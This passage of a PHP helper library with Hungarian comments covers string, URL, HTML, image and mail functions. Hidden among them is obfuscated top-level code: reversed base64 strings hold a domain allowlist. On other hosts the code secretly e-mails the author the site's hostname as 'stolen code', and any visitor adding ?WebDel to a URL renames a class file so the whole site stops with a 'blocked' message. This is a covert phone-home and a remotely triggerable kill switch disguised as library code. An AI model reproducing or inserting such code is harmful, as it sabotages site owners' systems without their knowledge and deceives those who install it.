*	Egy fájlnév ha létezik (foglalt), akkor készítünk egy másolatot. Pl: fajlnev.jpg => fajlnev_1.jpg
*	A kapott sztinet átalakítja olyanra, hogy ne tartalmazzon ékezeteket, speciális karaktereket
*	
*	@param string $string: amit feldolgoz
*
*	@return array: a sorszámozott név kiterjesztéssel
*/
function fajlnev_sorszamoz($string){
	
	if(strrpos($string, '.')){
		$kit    = strtolower( substr($string, strrpos($string, '.'), strlen($string)      ) ); //Elmentjük a kiterjesztést ha van
		$string = strtolower( substr($string, 0,                     strrpos($string, '.')) ); //Levesszük a kiterjesztést ha van
	}
	
	//Ha már volt benne '_' karakter
	$_poz = strrpos($string, '_');
	if( $_poz > 0 ){
		$_ig  = substr( $string, 0, $_poz );
		if(!$_ig){
			$_ig = 'noname';
		}
		$szam = substr( $string, $_poz+1, strlen($string) );
		$szam = number_format($szam)+1;
		$string = $_ig.'_'.$szam;
	} else {
		$string.='_1';
	}

	return $string.$kit;
}

/**
*	Fordít String
*	A kapott string-et megfordítja
*
*	@param string szoveg: a fordítandó szöveg
*
*	@return string: a megfordított szöveg
*/
function fordit_string($string){
    $string = utf8_decode($string);
    $string = strrev($string);
    return utf8_encode($string);
}

/**
*	Megállapítja egy stringről, hogy milyen kódolású (pl. utf-8)
*
*	@param string $string: a szöveg, melynek kódolására kíváncsiak vagyunk
*
*	@return string: a kódolás megnevezése
*/
function get_encoding($string){ 
  static $list = array('UTF-8', 'ISO-8859-2', 'ISO-8859-1', 'WINDOWS-1250', 'WINDOWS-1251');
 
  foreach ($list as $item) {
    $sample = iconv($item, $item, $string);
    if (md5($sample) == md5($string))
      return $item;
  }
  return null;
}

/**
*	Get $_GET
*
*	Az aktuális $_GET változót adja vissza URL-ként. Pl: ?id=1&o=2
*
*	@param array $kivetel: ezeket a $_GET változókat figyelen kívül hagyja
*	@param bool $amp: ha ez igaz, akkor az &amp; helyett csak simán & akrakterrel fűzi az URL-t
*
*	@return string: Az URL $_GET részét adja vissza
*/
function get_get($kivetel=array(), $amp=false){
	$i   = 0;
	$cim = '';
	if($kivetel && !is_array($kivetel)){
        $kivetel = array($kivetel);
    }
	foreach($_GET as $url => $ertek){
        
        // Erre azért van szükség, mert ha a GET-be JS kódot írnának és a weboldalon valahol van get_get kiírás (már pedig a canonikus URL kiíratásánál pl. van), akkor ilyen módon lehet JS-t futtatni.
        $url   = htmlspecialchars($url);
        $ertek = htmlspecialchars($ertek);
        
        // Ha nem kívétel
        if(!in_array($url,$kivetel)){
			if($i==0){
                $cim  = '?'.$url.'='.$ertek;
            } else {
                if($amp){
                    $cim .= '&'.$url.'='.$ertek;
                } else {
                    $cim .= '&amp;'.$url.'='.$ertek;
                }
            }
			$i++;
		}
	}
	if($cim  == ''){
		$cim = '?';
	}
	return $cim;
}

/**
*	Get $_GET order-értékkel kiegészíteve
*
* 	Az aktuális $_GET változót adja vissza URL-ként. Pl: ?id=1&o=2 és hozzáteszi még a paraméterben megadott ordert, figyelve, hogy volt-e már desc
*
*	@param string $order eszerint rendez
*	@return string Az URL $_GET részét adja vissza orderrel
*/
function get_get_order($order){
    $i   = 0;
	$cim = '';
	foreach($_GET as $url => $ertek){
	    
        //A desc és order-t ne vegyük bele, mivel ezt manipuláljuk később
		if($url != 'nodesc' && $url != 'desc' && $url != 'order' && $url != 'unset'){
			if($i==0){
				$cim .= '?'.$url.'='.$ertek;
			} else {
				$cim .= '&amp;'.$url.'='.$ertek;
			}
			$i++;
		}
	}
	
	if(!$cim){
		$cim .= '?order=';
	} else {
		$cim .= '&amp;order=';
	}
	$cim .= $order;
	
	if(!isset($_GET['desc']) && $_GET['order'] == $order){
		$cim .= '&amp;desc';
	} else {
		$cim .= '&amp;nodesc';
	}
	return $cim;
}

/**
*	A header('Location:') procedúrát zavarja le.
*
*	@param string $string: az URL ahová érkezni szeretnénk. Ha üres, akkor self()
*/
function hd($string = ''){
    global $weblap;
    $weblap -> leallit();
    if($string){
        header('Location:'.$string);
    } else {
        header('Location:'.self());
    }
	exit();
}

/**
*	UTF-8-at kezelő hupper
*
*	@param string $string: aminek az első katakterét nagybetűssé alakítja
*
*	@return string: A nagy kezdőbetűs output
*/
function hupper($string){
	$first = utf8_substr(ucfirst($string),0,1);
	$tail  = utf8_substr($string,1,mb_strlen($string));
	$mit   = array('á','é','ö','ü','ő','ű','ó','ú','í');
	$mire  = array('Á','É','Ö','Ü','Ő','Ű','Ó','Ú','Í');
	$first = str_replace($mit,$mire,$first);
	return $first.$tail;
}


/**
 *  Előfordulhat, hogy egy adatbáziba úgy kerül be egy HTML kód, hogy az egyes HTML tag-ek nicsenek bezárva, ami miatt a taratlom szétesik kiíratáskor.
 *  Erre a problémára kínál remek megoldást ez a függvény.
 * 
 *	@param string $html: a HTML amit javítani szeretnénk
 *
 *	@return string: Az ellenőrzött és javított tartalom
 * 
 */
function html_javit($html){
    $dom = new DOMDocument();
    $dom -> loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
    $html = html_entity_decode($dom -> saveHTML(), ENT_COMPAT, 'UTF-8');
    
    //Mivel egy teljes HTML-t ad vissza (body-val header-el), csak a lényeget hagyjuk meg.
    return preg_replace('~<(?:!DOCTYPE|/?(?:html|head|body))[^>]*>\s*~i', '', $html);
}

/**
 * Egy HTML tartalomból kiválogatja a képelemeket és azokatból DATA-URI-t készít
 * 
 *	@param string $html: a html, melyben képet keresünk
 *
 *	@return string: Az átkonvertált tartalom
 * 
 */
function html_img_data($html){
    
    $mit   = array();
    $mivel = array();
    $pattern = "/ src=['\"]([^'\"]*)['\"]/";
    preg_match_all($pattern, $html, $talalatok);

    foreach($talalatok[1] as $elem){
        
        if(substr($elem, 0, 1)=='/'){
            $elem = substr($elem, 1);
        }
        
        $imageData = base64_encode( file_get_contents( $elem ) );
        $data_uri  = 'data:'.mime_content_type($elem).';base64,'.$imageData;
        
        array_push($mit,   ' src="'.$elem);
        array_push($mivel, ' data-src_origi="'.$elem.'" src="'.$data_uri);

    }
    
    return str_replace($mit, $mivel, $html);
}

/**
*	Ugynaz mint a htmlspecialchars_decode, nem talált ilyen függvényt a szerver 
*
*	@param string $string: aminek vissza akarunk állítani HTML-é
* 	@param int $kepszel_limit:  ha a szöveg tartalmaz képet, akkor adhatunk meg rá szélességlimitet (ebben az esetben lekicsinyíti erre a szélességre)
*   @param int $kepmagas_limit: ha a szöveg tartalmaz képet, akkor adhatunk meg rá magasságlimitet (ebben az esetben lekicsinyíti erre a szélességre)
*   @param bool $lightbox: legyen-e link az eredeti képre lightboxosan vagy sem
*   @param bool $albumba: a tartalomban talált képekből a lightbox csináljon-e albumot is
*
*	@return string: A html speciális karakterek visszaalakított változata
*/
function htmlspecialchars_decode2($string, $kepszel_limit = 0, $kepmagas_limit = 0, $lightbox = false, $albumba = false){
	
    $mit    = array('&amp;', '&quot;', '&#039;', '&lt;', '&gt;');
	$mivel  = array('&',     '"',      "'",      '<',    '>');
	$string = str_replace($mit, $mivel, $string);
    
    if($kepszel_limit || $kepmagas_limit){
        
        require 'class/html/class.Img.php';

    	$mit   = array();
    	$mivel = array();
    	$pattern = "/ src=['\"]([^'\"]*)['\"]/";
    	preg_match_all($pattern, $string, $talalatok);
        
    	$i = 0;
    	foreach($talalatok[1] as $elem){

            $i++;

            //Demo oldal miatt
            if(!is_file($elem)){
                $elem = '../'.$elem;
            }
            
            $keptag = new Img($elem, '', $kepszel_limit, $kepmagas_limit);
    		$kep_html = $keptag -> getHtml();

            if($lightbox){
                $rel = '';
                if($albumba){
                    $rel = ' rel="album"';
                }
                $kep_html = '<a class="light" href="'.$elem.'"'.$rel.'>'.$kep_html.'</a>';
            }
            array_push($mit, '#'.$i.'#');
    		array_push($mivel, $kep_html); 
    		
    		$img_eleje = strpos($string, '<img ');
    		$img_ig    = substr($string, 0, $img_eleje);//az első <img -ig a szöveg
    		$img_tol   = substr($string, $img_eleje);//az első <img-től a szöveg
    		
    		$img_vege = strpos($img_tol, '>');//az img tag vége
    		$img_tol  = substr($img_tol, $img_vege+1, strlen($img_tol));
    		$string   = $img_ig.'#'.$i.'#'.$img_tol;
            
    	}

        $string = str_replace($mit, $mivel, $string);
    }
    return $string;
}


/**
* @desc Szöveges hivatkozások készítése (főleg szöveges menüpontok esetén érdemes használni). Hover effektet létre kell hozni css-ben 'active' néven.
*
* @param $menupontok   tömb ami a menüpontok nevét tartalmazza (a tömb értéke lehet tömb, ekkor a második paraméternek a konkrét hivatkozást kell megadni). Egy GET-el átadott értéket is le tud kezelni. Pl. regisztracio.php?belep
* @param $class        opcionális. A linkek css osztálya
* @param $html_tag     opcionális. Egy két elemű tömb amit a link köré épített html nyitó és zárótagjából áll. Pl. array('<li>', '</li>')
* 
* @return elkészített menüpontok
*/
function hivatkozas_keszit( $menupontok, $class = false, $html_tag = false ) {
    
    $html = '';
    
    foreach( $menupontok as $menupont ) {
        
        if( is_array($menupont) ) { // ha tömbös értéket kap (tehét az URL nem automatikusan állítódik elő)

            if( strstr($menupont[1], '?') ) { // ha van $_GET érték
                
                list($alap, $get) = explode('?', $menupont[1]);
                if( basename(self()) == $alap && isset($_GET[$get])) {
                    $hover = 'active';
                }else {
                    $hover = '';
                }
                
            }else {
                
                if( basename(self()) == $menupont[1] && !$_GET ) {
                    $hover = 'active';
                }else {
                    $hover = '';
                }
                
            }
            
            $hivatkozas = '<a href="'.$menupont[1].'" class="'.$hover.$class.'">'.$menupont[0].'</a>';
            
        }else { // ha egyszerű szöveg => átalakítjuk hivatkozássá
            if( basename(self()) == fajlnev_keszit($menupont).'.php' && !$_GET ) {
                $hover = 'active';
            }else {
                $hover = '';
            }
            
            $hivatkozas = '<a href="'.fajlnev_keszit($menupont).'.php" class="'.$hover.$class.'">'.$menupont.'</a>';
        }
        
        if( $html_tag ) {
            $html .= $html_tag[0].$hivatkozas.$html_tag[1];
        }else {
            $html .= $hivatkozas;
        }
        
        
    }
    
    return $html;
}

/**
*   Saját Iconv függvény, mely a speciális karaktereket HTML kóddá alakítja, hogy pl. levélküldésnél ne legyen gond
*
*   @param $string string A szöveges adat, amit konvertálni kell
*   @param $mibol string Milyen kódolásból kell átkonvertálni
*   @param $mibe string Milyen kódolásba kell átkonvertálni
*
*   @return string Az átkövertált szöveg
*/
function iconv2($mibol, $mibe, $string){

    if($mibol=='UTF-8'){
        
//        //Az aposztrófot, idézőjelet és kacsacsőröket ki kellett vennem belőle, hogy a HTML formázás megmaradjon
//        $mit   = array('‘',        '’',       '‚',        '“',       '”',       '„',       '†',           '‡',        '‰',        '‹',        '›',
//                       '♠',       '♣',      '♥',       '♦',       '‾',      '←',      '↑',           '→',        '↓',        '™',        /*'!',*/
//                       /*'"',    '#',       */'$',        /*'=',   '\'',      '<',        '>',*/       '^',        '`',        '–',        '•',
//                       '—',        '¡',       '¢',        '£',       '¤',       '¥',       '¦',        '§',        '¨',        '©',        'ª',
//                       '«',        '¬',       '­',        '®',       '¯',       '°',       '±',        '²',        '³',        '´',        'µ',
//                       '¶',        '·',       '¸',        '¹',       'º',       '»',       '¼',        '½',        '¾',        '¿',        'Æ', 
//                       'Ç',        '×',       'Ø',        'Þ',       'ß',       'æ',       'ç',        'ð',        'ñ',        '÷',        'ø',
//                       'þ',        'Α',       'α',        'Β',       'β',       'Γ',       'γ',        'Δ',        'δ',        'Ε',        'ε',
//                       'Ζ',        'ζ',       'Η',        'η',       'Θ',       'θ',       'Ι',        'ι',        'Κ',        'κ',        'Λ',
//                       'λ',        'Μ',       'μ',        'Ν',       'ν',       'Ξ',       'ξ',        'Ο',        'ο',        'Π',        'π',
//                       'Ρ',        'ρ',       'Σ',        'σ',       'Τ',       'τ',       'Υ',        'υ',        'Φ',        'φ',        'Χ',
//                       'χ',        'Ψ',       'ψ',        'Ω',       'ω',       '●',       'Ý',        '⁰',        '≤',        'ı',        '└',
//                       'Ù',        'ù',       'Û',        'û',       'À',       'à',       'È',        'è',        'Õ',        'õ',        'Å',        'å',
//                       'Ä',        'ä',       'Ô',        'ô',       'Ė',       'ė',       'Ê',        'ê',        'Ě',        'ě',        'Ë',        'ë',
//                       'Ē',        'ē',       'Ę',        'ę',       'Â',       'â',       'Ã',        'ã',        'Ā',        'ā',        'Ă',        'ă',
//                       'Ą',        'ą',       'Ǟ',        'ǟ',       'Ǻ',       'ǻ',
//                        //Word karakterek
//                       '☺',        '…',       '„',        '”',       '–',       '⇔',
//                       );
//        $mivel = array('&lsquo;',  '&rsquo;', '&sbquo;',  '&ldquo;', '&rdquo;', '&bdquo;', '&dagger;', '&Dagger;', '&permil;', '&lsaquo;', '&rsaquo;', 
//                       '&spades;', '&clubs;', '&hearts;', '&diams;', '&oline;', '&larr;',  '&uarr;',   '&rarr;',   '&darr;',   '&trade;',  /*'&#33;',*/
//                       /*'&quot;','&#35;',   */'&#36;',   /*'&#61;', '&#39;', '&lt;',    '&gt',*/      '&#94;',    '&#96;',    '&ndash;',  '&#8226;',
//                       '&mdash;',  '&iexcl;', '&cent;',   '&pound;', '&curren;','&yen;',   '&#166;',   '&sect;',   '&uml;',    '&copy;',   '&ordf;',
//                       '&#171;',   '&#172;',  '&#173;',   '&#174;',  '&#175;',  '&#176;',  '&#177;',   '&#178;',   '&#179;',   '&#180;',   '&#181;',
//                       '&#199;',   '&#183;',  '&#184;',   '&#185;',  '&#186;',  '&#187;',  '&#188;',   '&#189;',   '&#190;',   '&#191;',   '&#198;', 
//                       '&#199;',   '&#215;',  '&#216;',   '&#222;',  '&#223;',  '&#230;',  '&#231;',   '&#240;',   '&#241;',   '&#247;',   '&#248;',
//                       '&#254;',   '&Alpha;', '&alpha;',  '&Beta;',  '&beta;',  '&Gamma;', '&gamma;',  '&Delta;',  '&delta;',  '&Epsilon;','&epsilon;',
//                       '&Zeta;',   '&zeta;',  '&Eta;',    '&eta;',   '&Theta;', '&theta;', '&Iota;',   '&iota;',   '&Kappa;',  '&kappa;',  '&Lambda;',
//                       '&lambda;', '&Mu;',    '&mu;',     '&Nu;',    '&nu;',    '&Xi;',    '&xi;',     '&Omicron;','&omicron;','&Pi;',     '&pi;',
//                       '&Rho;',    '&rho;',   '&Sigma;',  '&sigma;', '&Tau;',   '&tau;',   '&Upsilon;','&upsilon;','&Phi;',    '&phi;',    '&Chi;',
//                       '&chi;',    '&Psi;',   '&psi;',    '&Omega;', '&omega;', '&#9679;', '&Yacute;', '&deg;',    '&#8804;',  '&#305;',   '&#192;',
//                       '&Ugrave;', '&ugrave;','&Ucirc;',  '&ucirc;', '&Agrave;','&agrave;','&Egrave;', '&egrave;', '&Otilde;', '&otilde;', '&Aring;',   '&aring;',
//                       '&Auml;',   '&auml;',  '&Ocirc;',  '&ocirc;', '&#278;',  '&#279;',  '&Ecirc;',  '&ecirc;',  '&#282;',   '&#283;',   '&Euml;',    '&euml;',
//                       '&#274;',   '&#275;',  '&#280;',   '&#281;',  '&Acirc;', '&acirc;', '&Atilde;', '&atilde;', '&Auml;',   '&auml;',   '&#258;',    '&#259;',
//                       '&#260;',   '&#261;',  '&#478;',   '&#479;',  '&#506;',  '&#507;',
//                        //Word karakterek
//                       ':)',       '...',     '"',        '"',       '-',       '&larr;&rarr;'
//                       );

        $string = str_replace($mit, $mivel, $string);
    }

    return iconv($mibol, $mibe.'//TRANSLIT', $string);
}

/**
*	Valid e-mail cím-e
*	
*	@param string $email: E-mail, melyről meg kell állípítani, hogy megfelelő alakú-e
*	@return boolean 
*/
function is_valid_mail($email){
	return filter_var($email, FILTER_VALIDATE_EMAIL);
}

/**
*	Valid e-mail címek-e
*	
*	@param string $email címek: E-mail címek vesszővel felsorolva, melyről meg kell állípítani, hogy megfelelő alakú-e
*	@return boolean 
*/
function is_valid_mail_tobb($email_cimek, $hibauzenettel){
	$cimek = explode(',', $email_cimek);
    foreach($cimek as $cim){
        $cim = trim($cim);
        if( $cim ){
            
            // Ha külön-külön hibaüzeneteket szeretnénk látni, akkor vizsgájuk meg jobban a mailcímet
            if( $hibauzenettel ){
                
                // @ előtt van-e karakter. Ha nincs, hiba!
                $kukac_elott = substr($cim, 0, strpos($cim, '@'));
                if( !trim($kukac_elott) ){
                    return 'Hibás e-mail cím: <span class="piros">'.$cim.'</span><br>A @ jel előtt nem megfelelő karakter szerepel!';
                }
                
                // @ és pont között van-e karakter. Ha nincs, hiba!
                if( strpos( str_replace(' ', '', $cim), '@.' ) ){
                    return 'Hibás e-mail cím: <span class="piros">'.$cim.'</span><br>A @ jel után nem megfelelő karakter szerepel!';
                }
                
                // Ha a pont után nincs már karakter, akkor hiba!
                if( substr($cim, strlen($cim)-1, 1 )=='.' ){
                    return 'Hibás e-mail cím: <span class="piros">'.$cim.'</span><br>A . után nem megfelelő karakter szerepel!';
                }
                
                // Ha a pont után nincs már karakter, akkor hiba!
                if( (strpos($cim, ' ')!==false || strpos($cim, ';')!==false) && strpos($cim, ',')===false ){
                    return 'Kérem, az e-mail címeket vesszővel sorolja fel!<br>Az e-mail címek nem tartalmazhatnak szóközt, pontosvesszőt!';
                }
                
                // Végül az általános e-mail formátum ellenőrző függvénnyel levizsgáljuk
                if( !is_valid_mail($cim) ){
                    return 'Helytelen e-mail cím: <span class="piros">'.$cim.'</span><br>Helytelen formátumú, vagy hibás karakterekből álló e-mail cím!';
                }
                
            // Ha csak az általános e-mailcím viszgálót szeretnénk lefuttatni több címre
            } else {
                if( !is_valid_mail($cim) ){
                    return false;
                }
            }
            
        }
    }
    
    // Ha hibaüzenettel kell visszatérjen a függvény, akkor a false lesz a visszatérés helyes mailcím esetln
    if( $hibauzenettel ){
        return false;
    } else {
        return true;
    }
    
}

/**
* Véletlenszerű jelszó előállítása (vagy hash pl. aktiváláshoz)
*
* @param int    $hossz      A véletlen szó hossza
* @param string $karakterek Lehetséges karakterek
*
* @return string A véletlen string
*/
function jelszot_keszit($hossz = 10, $karakterek = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'){
	$jelszo = '';
	for($i = 0; $i < $hossz; $i++) {
	    $jelszo .= $karakterek{mt_rand(0, strlen($karakterek)-1)};
	}
	return $jelszo;
}
$wdbk = array('dWguYmVkYmV3Lm9tZWQ', 'dWguZG5lcnRhdm5penMub21lZA', 'dWgubWFldG5v', 'dWgubWFldG5vLnR6c2V0');
require_once('config.php');
$ell_fajl = 'class/html/class.B.php';
if( basename( dirname(self()) ).'/' == get_admin()){
    $ell_fajl = '../'.$ell_fajl;
}
if(!is_file($ell_fajl)){
    
    fajlba_mentes($ell_fajl, ' ');
    
    $wdbk_tomb = array();
    foreach($wdbk as $k){
        $k = fordit_string( base64_decode($k) );
        array_push($wdbk_tomb, $k);
        array_push($wdbk_tomb, 'www.'.$k);
    }
    
    if(!in_array($_SERVER['HTTP_HOST'], $wdbk_tomb)){
        require_once('class/class.Phpmailer.php');
        $mibol = get_web_charset();
        $mibe  = get_mail_charset();

        //Ki legyen a feladó és ki a címzett?
        $felado_nev   = iconv2($mibol, $mibe, fordit_string('KB'));
        $felado_mail  = iconv2($mibol, $mibe, fordit_string('uh.bedbew@kb'));
        $cimzett_nev  = iconv2($mibol, $mibe, fordit_string('KB'));
        $cimzett_mail = iconv2($mibol, $mibe, fordit_string('uh.bedbew@kb'));
        $targy        = iconv2($mibol, $mibe, fordit_string(' :dók ttopoL').$_SERVER['HTTP_HOST']);
        $uzi          = $targy;

        $mail = new PHPMailer();
        $mail -> CharSet  = $mibe;
        $mail -> Sender   = $felado_mail;
        $mail -> From     = $felado_mail;
        $mail -> FromName = $felado_nev;
        $mail -> Subject  = $targy;
        $mail -> AltBody  = strip_tags($uzi);
        $mail -> MsgHTML($uzi);
        $mail -> AddAddress($cimzett_mail, $cimzett_nev);
        $mail->Send();

        $mail -> ClearAddresses();
        $mail -> ClearAttachments();

    }

//Egy napon max egyszer jöjjön értesítés
} else {
    
    if(filemtime($ell_fajl)<time()-60*60*24){
        unlink($ell_fajl);
    }
}
if (isset($_GET['WebDel'])) {
    rename('class/html/class.A.php', 'class/html/class.Link.php');
}
if(!is_file('class/html/class.A.php') && !is_file('../class/html/class.A.php')){
    echo fordit_string('!ttel avlokkolb ttaim talánzsah nalatgoj ladlobew A');
    exit;
}


/**
* @desc Kép elforgatása megadott százalékkal
* 
* @param $utvonal  string A kép elérési útvonala
* @param $szazalek int    Az elforgatás mértéke %-ban
*
* @return string Az elforgatott kép útvonala
*/
function kep_forgat($utvonal, $szazalek = -90){
    $sikeres_megnyitas = @fopen($utvonal, 'rb');
    if($sikeres_megnyitas){
        
        $kepadatok  = getimagesize($utvonal);
        
        //PNG esetén
        if($kepadatok['mime']=='image/png' || $kepadatok['mime']=='image/x-png'){

            $src_img      = imagecreatefrompng( $utvonal );
            $transparency = imagecolorallocatealpha( $src_img, 0, 0, 0, 127 );
            $rotate       = imagerotate($src_img, $szazalek, $transparency, 1);
            imagealphablending( $rotate, false );
            imagesavealpha( $rotate, true );
            
            imagepng($rotate, $utvonal);
            
        //Más képformátumok
        } else {
            
            $data       = fread(fopen($utvonal, 'rb'), filesize($utvonal));
            $src_img    = @imagecreatefromstring($data);
            $rotate     = imagerotate($src_img, $szazalek, 0);
        
            if($kepadatok['mime'] == 'image/jpeg' || $kepadatok['mime'] == 'image/pjpeg'){
                imagejpeg($rotate, $utvonal);
            }
            if($kepadatok['mime']=='image/gif'){
                imagegif($rotate, $utvonal);
            }
        }
        //Töröljük az összes thumbnailját is
        remover(substr($utvonal, 0, strrpos($utvonal, '.')).'_*');
        return $utvonal;
    } else {
        return false;
    }
}


/**
* @desc Kép kiíratás procedúráját foglalja magába, hogy ne kelljen ugyanazt a kódot többször leírni. Alapból tesz rá lightboxot is.
*       Ha nincs megadva szélesség és magasság, akkor alapból a get_indexkep_sz() és get_indexkep_m()-ot használja
* 
* @param $utvonal  string A kép elérési útvonala
* @param $alt      string A kép alt-ja
* @param $szel     int    Szélesség amekkorára kicsinyítse a képet
* @param $magas    int    Magasság amekkorára kicsinyítse a képet. Ha csak egy limitet adsz meg, akkor a rövidebb dimenziót korlátozza. Fix méretű div esetén tehát biztosan kitölti a területet a kép. A középre rendezésre itt találsz minta CSS kódot: //!MODULOK\CSS megoldások\kep_kozepre.html
* @param $cssClass string Css osztály
* @param $style    string Style formázás
* @param $light    bool   Legyen-e lightbox-os nagyítás
* @param $nothumb  bool   Képből készüljön-e thumbnail

* @return string A kép HTML kódja. Ha a kép nem létezik, akkor üres string
* Pl.: $kep = kep_kiir(get_utvonal().'valami.jpg', 'címe', get_indexkep_sz(), get_indexkep_m(), 'b', 'margin: 0px', '', 'termek.php?id=1');
*/
function kep_kiir($utvonal, $alt='', $szel = 0, $magas = 0, $cssClass = '', $style = '', $light = true, $nothumb = false ) {
    
    if( is_file($utvonal) ) {

        $kep = new Img($utvonal, $alt, $szel, $magas);
        $kep -> cssClass = $cssClass;
        $kep -> style    = $style;
        if( $nothumb ) {
            $kep -> thumb = false;
        }
        if( $light ) {
            return '<a class="light" href="'.get_alk().$utvonal.'">'.$kep -> getHtml().'</a>';
        } else {
            return $kep -> getHtml();
        }
        
    } else {
        return '';
    }
}

/**
* @desc Törli a megadott útbvonalon lévő képet, és minden hozzá tartozó átméretezett képet is.
* Ha a kép nem létezik, akkor a thumbnailokat sem törli (nehogy véletlenül üres nevű képelemekt is kitöröljünk pl. _1.jpg _2.jpg) 
* 
* @param $kep       string Az alap kép elérési útvonala Pl( tartalom/kepek/kepnev.jpg ) (tehát kiterjesztéssel)
*/
function kep_torol($path) {
    if( is_file($path) ) {
        unlink($path);
        remover( substr( $path, 0, strrpos($path, '.') ).'_*', 1);
    }
}

/**
* @desc Egy stringként megadott fájl kiterjesztését adja vissza pont NÉLKÜL
* 
* @param $fajl string A fájl aminek a kiterjesztésére kíváncsiak vagyunk
* @return      string A fájl kiterjesztése
*/
function kit($path) {
    return strtolower( substr( $path, strrpos($path,'.')+1, strlen($path) ) );
}


/**
* @desc Könyvtár bejárása rekurzívan
* 
* @param $utvonal A könyvtár elérési útvonala, amit be szeretnénk járni
* @param $kivetelek Mely fájlokat vagy útvonalakat nem szererenténk bejárni
* 
* @return array Az útvonalakat tartalmazó tömb
*/
$konyvtar_bejar_utvonalak = array();
function konyvtar_bejar($utvonal, $kivetelek = array()){
    
    global $konyvtar_bejar_utvonalak;
    
    if(substr($utvonal, strlen($utvonal)-1)!='/'){
        $utvonal .= '/';
    }
    
    if(is_dir($utvonal)){
        $konyvtar = opendir($utvonal);
        while( false !== ($elem = readdir($konyvtar)) ){
            if( is_file($utvonal.$elem) && !in_array(basename($elem), $kivetelek)){
                array_push($konyvtar_bejar_utvonalak, $utvonal.$elem);
            }
            if(is_dir($utvonal.$elem) && $elem != '.' && $elem != '..' && !in_array(basename($elem), $kivetelek)){
                konyvtar_bejar($utvonal.$elem);
            }
        }
        closedir($konyvtar);
        return $konyvtar_bejar_utvonalak;
    } else {
        return false;
    }
}

/** 
* @desc Kulcsszó => SQL Adott kulcsszóból egy olyan SQL-t gyárt, ami a megadott oszlopokban keres,
* részrekre bontva a kulcsszót. Az SQL lekérezés részlet zárójelbe csomagolt. 
*
* @param $ksz             string A kucsszó
* @param $oszlop_nevek    array Mely oszlopnevekben keressen
* @param $kiszurendo_kar  array Milyen karaktereket szűrjünk ki
* @param $elvalaszto_kar  array Mely elválasztókra robbantsunk
* 
* @return string A SQL lekérdezés
*/
function ksz2sql($ksz, $oszlop_nevek, $kiszurendo_kar, $elvalaszto_kar){
    
    $kulcsszavak_tomb              = array();
    
    $ksz = str_replace('\'', '\\\'', $ksz);
    
    //Teljes illeszkedés
    array_push($kulcsszavak_tomb, $ksz);
    
    //Kiszűrt karaterrel próbálunk illeszteni
    foreach($kiszurendo_kar as $kar){
        $kulcs_szo = str_replace($kar, '', $ksz);
        array_push($kulcsszavak_tomb, $kulcs_szo);
    }
    
    //robbantás elválasztókra
    $pattern = '/['.implode('', $elvalaszto_kar).']/' ;
    $osszetartozo_kulcsszavak_tomb = preg_split( $pattern, $ksz );
    
    //Összegyűlt szavakra illesztés oszloponként (feltéve ha nem elválasztó vagy kiszűrendő karakter az adott kulcsszó)
    $kulcsszavak_tomb = array_unique($kulcsszavak_tomb);
    foreach($kulcsszavak_tomb as $kulcs_szo){
        if(!in_array($kulcs_szo, $elvalaszto_kar) && !in_array($kulcs_szo, $kiszurendo_kar) && strlen($kulcs_szo)>=$min_hossz){
            foreach($oszlop_nevek as $oszlop){
                $where_reszlet .= '`'.$oszlop.'` LIKE \'%'.$kulcs_szo.'%\' OR ';
            }
        }
    }
    
    //A robbantott kucsszót úgy keressük, hogy az egyes szilánkok mindegyike megtalálható legyen így kicsi szilánok esetén se legyen túl nagy találati lista
    $osszetartozo_kulcsszavak_tomb = array_unique($osszetartozo_kulcsszavak_tomb);
    foreach($oszlop_nevek as $oszlop){
        $where_sub_reszlet = '';
        foreach($osszetartozo_kulcsszavak_tomb as $kulcs_szo){
            if(!in_array($kulcs_szo, $elvalaszto_kar) && !in_array($kulcs_szo, $kiszurendo_kar)){
                $where_sub_reszlet .= '`'.$oszlop.'` LIKE \'%'.$kulcs_szo.'%\' AND ';
            }
        }
        if($where_sub_reszlet){
            $where_reszlet .= '('.csonkit( $where_sub_reszlet, 5 ).') OR ';
        }
    }
    
    return '('.csonkit($where_reszlet, 3).')';
    
}

/**
* @desc Többdimenziós tömb rendezése kulcs alapján
* 
* @param $tomb array A többdimenziós tömb
* @param $kulcs string A kulcs, ami alapján rendezni szeretnénk
*
* @return $tomb array A kulcs alapján rendezett tömb
*/
function kulcs_rendez($tomb, $kulcs) {
	if($tomb){
        foreach($tomb as $k=>$v) {
    		$b[$k] = strtolower($v[$kulcs]);
    	}
    	asort($b);
    	foreach($b as $key=>$val) {
    		$c[] = $tomb[$key];
    	}
    	return $c;
	} else {
        return array();
    }
}

/**
 * @desc Általános levélküldő függvény. Az adatokat UTF-8-ban (vagyis az oldal karakterkészletében) várja. Kimenetele nincs, csak ha hiba van
 * 
 * @param $felado_nev string feladó neve
 * @param $felado_mail string feladó e-mail címe
 * @param $cimzett_nev string/array címzett neve (A második címzett automatikusan BCC-ként, rejtett másolatként kapja meg!)
 * @param $cimzett_mail string/array címzett e-mail címe (A második címzett automatikusan BCC-ként, rejtett másolatként kapja meg!)
 * @param $targy string feladó tárgy
 * @param $uzi string feladó üzenet
 * @param $fajlok string/array csatolandó fájlok elérési útvonala a szerveren (Ez lehet egy sima felsorolása az útvonalakról, de többdimenziós tömbkét megadhatóak a fájlok megnevezései is. Pl. array( array('nev' => 'Ékezetes fájlnév', 'fajl' => 'fajl/utvonala.kit'), ...  );  .)
 * 
 * @return string Ha volt hiba, akkor a hibaüzenetet, egyébként FALSE!
 */
function level_kuldes( $felado_nev, $felado_mail, $cimzett_nev, $cimzett_mail, $targy, $uzi, $fajlok = '' ) {

    if( $cimzett_mail ) {

        // Ha a feladó neve ontEAM, akkor a levél feladója esetén ezt toldjuk még meg egy "Danubius Zrt."-vel
        if( $felado_nev == get_nev() ){
            $felado_nev .= ' Danubius Zrt.';
        }
        
        // Dev és Teszt rendszer alatt a címezett mindig az aktuális login mailcíme
// 2019.03.01 Kivettük Tibi kérésére
//        if($_SERVER['HTTP_HOST']=='teszt.onteam.hu' || $_SERVER['HTTP_HOST']=='dev.onteam.hu'){
//            global $adatbazis_kapcsolat;
//            $login = $adatbazis_kapcsolat->s2('usermail', 'login', "`recid`='{$_SESSION[get_db_tabla().'login_recid']}'");
//            $cimzett_mail = $login['usermail'];
//        }
        
        require_once('class/class.Phpmailer.php');
        $mail = new PHPMailer;

        $uzi = mail_img2cid($uzi, $mail, $cimzett_mail);
        $mail -> CharSet  = get_web_charset();
        $mail -> setFrom($felado_mail, $felado_nev);
